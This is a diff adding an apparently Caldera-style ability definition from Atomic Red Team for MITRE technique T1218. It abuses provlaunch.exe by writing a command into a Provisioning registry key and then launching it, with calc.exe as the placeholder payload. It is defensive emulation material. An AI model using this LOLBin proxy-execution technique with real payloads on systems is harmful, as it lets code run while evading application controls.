@@ -1,0 +1,35 @@
+- id: ab76e34f-28bf-441f-a39c-8db4835b89cc
+  name: Provlaunch.exe Executes Arbitrary Command via Registry Key
+  description: 'Provlaunch.exe executes a command defined in the Registry. This test
+    will create the necessary registry keys and values, then run provlaunch.exe to
+    execute an arbitrary command.
+
+    - https://twitter.com/0gtweet/status/1674399582162153472
+
+    - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
+
+    Registry keys are deleted after successful execution.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      sh:
+        command: reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1
+          /v altitude /t REG_DWORD /d 0; reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2
+          /v Commandline /d calc.exe; c:\windows\system32\provlaunch.exe LOLBin
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2018-04-18T17:59:24.739Z'
+    atomic_guid: ab76e34f-28bf-441f-a39c-8db4835b89cc
+    import_timestamp: '2025-06-24T11:15:00.301980Z'
